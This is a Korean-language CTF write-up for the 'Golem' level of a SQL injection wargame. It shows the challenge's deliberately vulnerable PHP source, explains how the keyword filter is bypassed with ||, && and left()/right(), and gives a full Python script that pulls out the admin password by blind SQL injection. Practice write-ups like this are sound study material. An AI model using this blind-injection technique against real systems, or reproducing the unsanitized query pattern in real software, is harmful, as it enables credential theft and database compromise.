---
layout: default
title: Golem
parent: Load Of SQL Injection
nav_order: 11
---

# Golem

and와 or 연산자를 각각 ||와 &&으로 우회하고, substr 함수를 left함수와 right 함수로 우회할 수 있다.

Blind SQL Injection을 진행해 admin의 pw를 가져와 인증하면 풀 수 있다. 

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
  highlight_file(__FILE__); 
?>
```

python으로 툴을 짜 pw를 가져올 수 있다.

```python
import urllib, urllib2, cookielib, re, ssl
key=''
length=0
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
opener.addheaders={('User-agent','Mozila/5.0(compatible;MSIE 5.5;Windows NT)')}

loginUrl2='https://los.eagle-jump.org/?login'
login_form={"id":"los_id","pw":"los_pw"}
login_form=urllib.urlencode(login_form)
reqLogin = opener.open('https://los.eagle-jump.org/?login',login_form)
url = 'https://los.eagle-jump.org/gate.php'
req=opener.open(url)

print 'start Blind SQL Injection'
print "search key's length"
while 1:
    length=length+1
    url="https://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw='|| instr(id,0x61646d696e) %%26%%26 length(pw) like %d%%23"%(length)
    print url
    resp=opener.open(url)
    rresp=resp.read()
    find=re.findall("Hello admin",rresp)
    if find:
        break
print length

print 'search key.'
lenck=1
while 1:
    subkey = 31
    for x in range(96):
        subkey=subkey+1
        chrkey=hex(subkey)
        hexkey=chr(subkey)
	if hexkey=="%":
		subkey=subkey+1
		chrkey=hex(subkey)
		hexkey=chr(subkey)
        url="https://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw='|| instr(id,0x61646d696e) %%26%%26 right(left(pw,%d),1) like %s%%23" %(lenck,chrkey)
        print url
        resp=opener.open(url)
        rresp=resp.read()
        find=re.findall("Hello admin",rresp)
        if find:
            print 'find'
            key=key+hexkey
            break
    lenck=lenck+1
    if lenck-1==length:
        break

print 'find key.'
print key.lower()
```